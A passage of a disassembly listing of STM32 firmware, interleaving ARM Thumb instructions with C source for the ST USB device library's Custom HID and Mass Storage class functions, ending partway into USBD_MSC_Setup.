 8008bd4:	b480      	push	{r7}
 8008bd6:	b083      	sub	sp, #12
 8008bd8:	af00      	add	r7, sp, #0
 8008bda:	6078      	str	r0, [r7, #4]
 8008bdc:	460b      	mov	r3, r1
 8008bde:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008be0:	687b      	ldr	r3, [r7, #4]
 8008be2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008be6:	687b      	ldr	r3, [r7, #4]
 8008be8:	32b0      	adds	r2, #176	; 0xb0
 8008bea:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bee:	2200      	movs	r2, #0
 8008bf0:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008bf4:	2300      	movs	r3, #0
}
 8008bf6:	4618      	mov	r0, r3
 8008bf8:	370c      	adds	r7, #12
 8008bfa:	46bd      	mov	sp, r7
 8008bfc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008c00:	4770      	bx	lr

08008c02 <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008c02:	b580      	push	{r7, lr}
 8008c04:	b084      	sub	sp, #16
 8008c06:	af00      	add	r7, sp, #0
 8008c08:	6078      	str	r0, [r7, #4]
 8008c0a:	460b      	mov	r3, r1
 8008c0c:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008c0e:	687b      	ldr	r3, [r7, #4]
 8008c10:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c14:	687b      	ldr	r3, [r7, #4]
 8008c16:	32b0      	adds	r2, #176	; 0xb0
 8008c18:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c1c:	2b00      	cmp	r3, #0
 8008c1e:	d101      	bne.n	8008c24 <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008c20:	2303      	movs	r3, #3
 8008c22:	e017      	b.n	8008c54 <USBD_CUSTOM_HID_DataOut+0x52>
  }

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c24:	687b      	ldr	r3, [r7, #4]
 8008c26:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c2a:	687b      	ldr	r3, [r7, #4]
 8008c2c:	32b0      	adds	r2, #176	; 0xb0
 8008c2e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c32:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008c34:	687b      	ldr	r3, [r7, #4]
 8008c36:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008c3a:	687a      	ldr	r2, [r7, #4]
 8008c3c:	33b0      	adds	r3, #176	; 0xb0
 8008c3e:	009b      	lsls	r3, r3, #2
 8008c40:	4413      	add	r3, r2
 8008c42:	685b      	ldr	r3, [r3, #4]
 8008c44:	68db      	ldr	r3, [r3, #12]
 8008c46:	68fa      	ldr	r2, [r7, #12]
 8008c48:	7810      	ldrb	r0, [r2, #0]
 8008c4a:	68fa      	ldr	r2, [r7, #12]
 8008c4c:	7852      	ldrb	r2, [r2, #1]
 8008c4e:	4611      	mov	r1, r2
 8008c50:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008c52:	2300      	movs	r3, #0
}
 8008c54:	4618      	mov	r0, r3
 8008c56:	3710      	adds	r7, #16
 8008c58:	46bd      	mov	sp, r7
 8008c5a:	bd80      	pop	{r7, pc}

08008c5c <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008c5c:	b580      	push	{r7, lr}
 8008c5e:	b084      	sub	sp, #16
 8008c60:	af00      	add	r7, sp, #0
 8008c62:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008c64:	687b      	ldr	r3, [r7, #4]
 8008c66:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c6a:	687b      	ldr	r3, [r7, #4]
 8008c6c:	32b0      	adds	r2, #176	; 0xb0
 8008c6e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c72:	2b00      	cmp	r3, #0
 8008c74:	d101      	bne.n	8008c7a <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008c76:	2303      	movs	r3, #3
 8008c78:	e01c      	b.n	8008cb4 <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c7a:	687b      	ldr	r3, [r7, #4]
 8008c7c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c80:	687b      	ldr	r3, [r7, #4]
 8008c82:	32b0      	adds	r2, #176	; 0xb0
 8008c84:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c88:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008c8a:	4b0c      	ldr	r3, [pc, #48]	; (8008cbc <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008c8c:	7819      	ldrb	r1, [r3, #0]
 8008c8e:	68fa      	ldr	r2, [r7, #12]
 8008c90:	230f      	movs	r3, #15
 8008c92:	6878      	ldr	r0, [r7, #4]
 8008c94:	f004 f920 	bl	800ced8 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008c98:	68fb      	ldr	r3, [r7, #12]
 8008c9a:	781a      	ldrb	r2, [r3, #0]
 8008c9c:	4b08      	ldr	r3, [pc, #32]	; (8008cc0 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c9e:	701a      	strb	r2, [r3, #0]
 8008ca0:	4b07      	ldr	r3, [pc, #28]	; (8008cc0 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008ca2:	781b      	ldrb	r3, [r3, #0]
 8008ca4:	f003 0302 	and.w	r3, r3, #2
 8008ca8:	2b02      	cmp	r3, #2
 8008caa:	d002      	beq.n	8008cb2 <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008cac:	4b05      	ldr	r3, [pc, #20]	; (8008cc4 <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008cae:	2201      	movs	r2, #1
 8008cb0:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008cb2:	2300      	movs	r3, #0
}
 8008cb4:	4618      	mov	r0, r3
 8008cb6:	3710      	adds	r7, #16
 8008cb8:	46bd      	mov	sp, r7
 8008cba:	bd80      	pop	{r7, pc}
 8008cbc:	200000a7 	.word	0x200000a7
 8008cc0:	2000026c 	.word	0x2000026c
 8008cc4:	20000270 	.word	0x20000270

08008cc8 <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008cc8:	b580      	push	{r7, lr}
 8008cca:	b084      	sub	sp, #16
 8008ccc:	af00      	add	r7, sp, #0
 8008cce:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008cd0:	687b      	ldr	r3, [r7, #4]
 8008cd2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008cd6:	687b      	ldr	r3, [r7, #4]
 8008cd8:	32b0      	adds	r2, #176	; 0xb0
 8008cda:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008cde:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008ce0:	68fb      	ldr	r3, [r7, #12]
 8008ce2:	2b00      	cmp	r3, #0
 8008ce4:	d101      	bne.n	8008cea <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008ce6:	2303      	movs	r3, #3
 8008ce8:	e016      	b.n	8008d18 <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008cea:	68fb      	ldr	r3, [r7, #12]
 8008cec:	69db      	ldr	r3, [r3, #28]
 8008cee:	2b01      	cmp	r3, #1
 8008cf0:	d111      	bne.n	8008d16 <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008cf2:	687b      	ldr	r3, [r7, #4]
 8008cf4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008cf8:	687a      	ldr	r2, [r7, #4]
 8008cfa:	33b0      	adds	r3, #176	; 0xb0
 8008cfc:	009b      	lsls	r3, r3, #2
 8008cfe:	4413      	add	r3, r2
 8008d00:	685b      	ldr	r3, [r3, #4]
 8008d02:	68db      	ldr	r3, [r3, #12]
 8008d04:	68fa      	ldr	r2, [r7, #12]
 8008d06:	7810      	ldrb	r0, [r2, #0]
 8008d08:	68fa      	ldr	r2, [r7, #12]
 8008d0a:	7852      	ldrb	r2, [r2, #1]
 8008d0c:	4611      	mov	r1, r2
 8008d0e:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008d10:	68fb      	ldr	r3, [r7, #12]
 8008d12:	2200      	movs	r2, #0
 8008d14:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008d16:	2300      	movs	r3, #0
}
 8008d18:	4618      	mov	r0, r3
 8008d1a:	3710      	adds	r7, #16
 8008d1c:	46bd      	mov	sp, r7
 8008d1e:	bd80      	pop	{r7, pc}

08008d20 <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008d20:	b480      	push	{r7}
 8008d22:	b083      	sub	sp, #12
 8008d24:	af00      	add	r7, sp, #0
 8008d26:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008d28:	687b      	ldr	r3, [r7, #4]
 8008d2a:	220a      	movs	r2, #10
 8008d2c:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008d2e:	4b03      	ldr	r3, [pc, #12]	; (8008d3c <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008d30:	4618      	mov	r0, r3
 8008d32:	370c      	adds	r7, #12
 8008d34:	46bd      	mov	sp, r7
 8008d36:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008d3a:	4770      	bx	lr
 8008d3c:	2000009c 	.word	0x2000009c

08008d40 <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008d40:	b480      	push	{r7}
 8008d42:	b083      	sub	sp, #12
 8008d44:	af00      	add	r7, sp, #0
 8008d46:	6078      	str	r0, [r7, #4]
 8008d48:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008d4a:	683b      	ldr	r3, [r7, #0]
 8008d4c:	2b00      	cmp	r3, #0
 8008d4e:	d101      	bne.n	8008d54 <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008d50:	2303      	movs	r3, #3
 8008d52:	e009      	b.n	8008d68 <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008d54:	687b      	ldr	r3, [r7, #4]
 8008d56:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008d5a:	687a      	ldr	r2, [r7, #4]
 8008d5c:	33b0      	adds	r3, #176	; 0xb0
 8008d5e:	009b      	lsls	r3, r3, #2
 8008d60:	4413      	add	r3, r2
 8008d62:	683a      	ldr	r2, [r7, #0]
 8008d64:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008d66:	2300      	movs	r3, #0
}
 8008d68:	4618      	mov	r0, r3
 8008d6a:	370c      	adds	r7, #12
 8008d6c:	46bd      	mov	sp, r7
 8008d6e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008d72:	4770      	bx	lr

08008d74 <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008d74:	b580      	push	{r7, lr}
 8008d76:	b084      	sub	sp, #16
 8008d78:	af00      	add	r7, sp, #0
 8008d7a:	6078      	str	r0, [r7, #4]
 8008d7c:	460b      	mov	r3, r1
 8008d7e:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008d80:	f241 0074 	movw	r0, #4212	; 0x1074
 8008d84:	f004 f938 	bl	800cff8 <USBD_static_malloc_MSC>
 8008d88:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008d8a:	68fb      	ldr	r3, [r7, #12]
 8008d8c:	2b00      	cmp	r3, #0
 8008d8e:	d109      	bne.n	8008da4 <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008d90:	687b      	ldr	r3, [r7, #4]
 8008d92:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d96:	687b      	ldr	r3, [r7, #4]
 8008d98:	32b0      	adds	r2, #176	; 0xb0
 8008d9a:	2100      	movs	r1, #0
 8008d9c:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008da0:	2302      	movs	r3, #2
 8008da2:	e06e      	b.n	8008e82 <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008da4:	687b      	ldr	r3, [r7, #4]
 8008da6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008daa:	687b      	ldr	r3, [r7, #4]
 8008dac:	32b0      	adds	r2, #176	; 0xb0
 8008dae:	68f9      	ldr	r1, [r7, #12]
 8008db0:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008db4:	687b      	ldr	r3, [r7, #4]
 8008db6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008dba:	687b      	ldr	r3, [r7, #4]
 8008dbc:	32b0      	adds	r2, #176	; 0xb0
 8008dbe:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008dc2:	687b      	ldr	r3, [r7, #4]
 8008dc4:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008dc8:	687b      	ldr	r3, [r7, #4]
 8008dca:	7c1b      	ldrb	r3, [r3, #16]
 8008dcc:	2b00      	cmp	r3, #0
 8008dce:	d12b      	bne.n	8008e28 <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008dd0:	4b2e      	ldr	r3, [pc, #184]	; (8008e8c <USBD_MSC_Init+0x118>)
 8008dd2:	7819      	ldrb	r1, [r3, #0]
 8008dd4:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008dd8:	2202      	movs	r2, #2
 8008dda:	6878      	ldr	r0, [r7, #4]
 8008ddc:	f003 feca 	bl	800cb74 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008de0:	4b2a      	ldr	r3, [pc, #168]	; (8008e8c <USBD_MSC_Init+0x118>)
 8008de2:	781b      	ldrb	r3, [r3, #0]
 8008de4:	f003 020f 	and.w	r2, r3, #15
 8008de8:	6879      	ldr	r1, [r7, #4]
 8008dea:	4613      	mov	r3, r2
 8008dec:	009b      	lsls	r3, r3, #2
 8008dee:	4413      	add	r3, r2
 8008df0:	009b      	lsls	r3, r3, #2
 8008df2:	440b      	add	r3, r1
 8008df4:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008df8:	2201      	movs	r2, #1
 8008dfa:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008dfc:	4b24      	ldr	r3, [pc, #144]	; (8008e90 <USBD_MSC_Init+0x11c>)
 8008dfe:	7819      	ldrb	r1, [r3, #0]
 8008e00:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008e04:	2202      	movs	r2, #2
 8008e06:	6878      	ldr	r0, [r7, #4]
 8008e08:	f003 feb4 	bl	800cb74 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008e0c:	4b20      	ldr	r3, [pc, #128]	; (8008e90 <USBD_MSC_Init+0x11c>)
 8008e0e:	781b      	ldrb	r3, [r3, #0]
 8008e10:	f003 020f 	and.w	r2, r3, #15
 8008e14:	6879      	ldr	r1, [r7, #4]
 8008e16:	4613      	mov	r3, r2
 8008e18:	009b      	lsls	r3, r3, #2
 8008e1a:	4413      	add	r3, r2
 8008e1c:	009b      	lsls	r3, r3, #2
 8008e1e:	440b      	add	r3, r1
 8008e20:	3324      	adds	r3, #36	; 0x24
 8008e22:	2201      	movs	r2, #1
 8008e24:	801a      	strh	r2, [r3, #0]
 8008e26:	e028      	b.n	8008e7a <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008e28:	4b18      	ldr	r3, [pc, #96]	; (8008e8c <USBD_MSC_Init+0x118>)
 8008e2a:	7819      	ldrb	r1, [r3, #0]
 8008e2c:	2340      	movs	r3, #64	; 0x40
 8008e2e:	2202      	movs	r2, #2
 8008e30:	6878      	ldr	r0, [r7, #4]
 8008e32:	f003 fe9f 	bl	800cb74 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008e36:	4b15      	ldr	r3, [pc, #84]	; (8008e8c <USBD_MSC_Init+0x118>)
 8008e38:	781b      	ldrb	r3, [r3, #0]
 8008e3a:	f003 020f 	and.w	r2, r3, #15
 8008e3e:	6879      	ldr	r1, [r7, #4]
 8008e40:	4613      	mov	r3, r2
 8008e42:	009b      	lsls	r3, r3, #2
 8008e44:	4413      	add	r3, r2
 8008e46:	009b      	lsls	r3, r3, #2
 8008e48:	440b      	add	r3, r1
 8008e4a:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008e4e:	2201      	movs	r2, #1
 8008e50:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008e52:	4b0f      	ldr	r3, [pc, #60]	; (8008e90 <USBD_MSC_Init+0x11c>)
 8008e54:	7819      	ldrb	r1, [r3, #0]
 8008e56:	2340      	movs	r3, #64	; 0x40
 8008e58:	2202      	movs	r2, #2
 8008e5a:	6878      	ldr	r0, [r7, #4]
 8008e5c:	f003 fe8a 	bl	800cb74 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008e60:	4b0b      	ldr	r3, [pc, #44]	; (8008e90 <USBD_MSC_Init+0x11c>)
 8008e62:	781b      	ldrb	r3, [r3, #0]
 8008e64:	f003 020f 	and.w	r2, r3, #15
 8008e68:	6879      	ldr	r1, [r7, #4]
 8008e6a:	4613      	mov	r3, r2
 8008e6c:	009b      	lsls	r3, r3, #2
 8008e6e:	4413      	add	r3, r2
 8008e70:	009b      	lsls	r3, r3, #2
 8008e72:	440b      	add	r3, r1
 8008e74:	3324      	adds	r3, #36	; 0x24
 8008e76:	2201      	movs	r2, #1
 8008e78:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 8008e7a:	6878      	ldr	r0, [r7, #4]
 8008e7c:	f000 fa2c 	bl	80092d8 <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 8008e80:	2300      	movs	r3, #0
}
 8008e82:	4618      	mov	r0, r3
 8008e84:	3710      	adds	r7, #16
 8008e86:	46bd      	mov	sp, r7
 8008e88:	bd80      	pop	{r7, pc}
 8008e8a:	bf00      	nop
 8008e8c:	2000010b 	.word	0x2000010b
 8008e90:	2000010a 	.word	0x2000010a

08008e94 <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008e94:	b580      	push	{r7, lr}
 8008e96:	b082      	sub	sp, #8
 8008e98:	af00      	add	r7, sp, #0
 8008e9a:	6078      	str	r0, [r7, #4]
 8008e9c:	460b      	mov	r3, r1
 8008e9e:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 8008ea0:	4b26      	ldr	r3, [pc, #152]	; (8008f3c <USBD_MSC_DeInit+0xa8>)
 8008ea2:	781b      	ldrb	r3, [r3, #0]
 8008ea4:	4619      	mov	r1, r3
 8008ea6:	6878      	ldr	r0, [r7, #4]
 8008ea8:	f003 fea2 	bl	800cbf0 <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 8008eac:	4b23      	ldr	r3, [pc, #140]	; (8008f3c <USBD_MSC_DeInit+0xa8>)
 8008eae:	781b      	ldrb	r3, [r3, #0]
 8008eb0:	f003 020f 	and.w	r2, r3, #15
 8008eb4:	6879      	ldr	r1, [r7, #4]
 8008eb6:	4613      	mov	r3, r2
 8008eb8:	009b      	lsls	r3, r3, #2
 8008eba:	4413      	add	r3, r2
 8008ebc:	009b      	lsls	r3, r3, #2
 8008ebe:	440b      	add	r3, r1
 8008ec0:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008ec4:	2200      	movs	r2, #0
 8008ec6:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 8008ec8:	4b1d      	ldr	r3, [pc, #116]	; (8008f40 <USBD_MSC_DeInit+0xac>)
 8008eca:	781b      	ldrb	r3, [r3, #0]
 8008ecc:	4619      	mov	r1, r3
 8008ece:	6878      	ldr	r0, [r7, #4]
 8008ed0:	f003 fe8e 	bl	800cbf0 <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 8008ed4:	4b1a      	ldr	r3, [pc, #104]	; (8008f40 <USBD_MSC_DeInit+0xac>)
 8008ed6:	781b      	ldrb	r3, [r3, #0]
 8008ed8:	f003 020f 	and.w	r2, r3, #15
 8008edc:	6879      	ldr	r1, [r7, #4]
 8008ede:	4613      	mov	r3, r2
 8008ee0:	009b      	lsls	r3, r3, #2
 8008ee2:	4413      	add	r3, r2
 8008ee4:	009b      	lsls	r3, r3, #2
 8008ee6:	440b      	add	r3, r1
 8008ee8:	3324      	adds	r3, #36	; 0x24
 8008eea:	2200      	movs	r2, #0
 8008eec:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008eee:	687b      	ldr	r3, [r7, #4]
 8008ef0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ef4:	687b      	ldr	r3, [r7, #4]
 8008ef6:	32b0      	adds	r2, #176	; 0xb0
 8008ef8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008efc:	2b00      	cmp	r3, #0
 8008efe:	d018      	beq.n	8008f32 <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 8008f00:	6878      	ldr	r0, [r7, #4]
 8008f02:	f000 fa6f 	bl	80093e4 <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8008f06:	687b      	ldr	r3, [r7, #4]
 8008f08:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f0c:	687b      	ldr	r3, [r7, #4]
 8008f0e:	32b0      	adds	r2, #176	; 0xb0
 8008f10:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008f14:	4618      	mov	r0, r3
 8008f16:	f004 f87d 	bl	800d014 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 8008f1a:	687b      	ldr	r3, [r7, #4]
 8008f1c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f20:	687b      	ldr	r3, [r7, #4]
 8008f22:	32b0      	adds	r2, #176	; 0xb0
 8008f24:	2100      	movs	r1, #0
 8008f26:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008f2a:	687b      	ldr	r3, [r7, #4]
 8008f2c:	2200      	movs	r2, #0
 8008f2e:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8008f32:	2300      	movs	r3, #0
}
 8008f34:	4618      	mov	r0, r3
 8008f36:	3708      	adds	r7, #8
 8008f38:	46bd      	mov	sp, r7
 8008f3a:	bd80      	pop	{r7, pc}
 8008f3c:	2000010b 	.word	0x2000010b
 8008f40:	2000010a 	.word	0x2000010a

08008f44 <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 8008f44:	b580      	push	{r7, lr}
 8008f46:	b086      	sub	sp, #24
 8008f48:	af00      	add	r7, sp, #0
 8008f4a:	6078      	str	r0, [r7, #4]
 8008f4c:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008f4e:	687b      	ldr	r3, [r7, #4]
 8008f50:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f54:	687b      	ldr	r3, [r7, #4]
 8008f56:	32b0      	adds	r2, #176	; 0xb0
 8008f58:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008f5c:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 8008f5e:	2300      	movs	r3, #0
 8008f60:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 8008f62:	2300      	movs	r3, #0
 8008f64:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
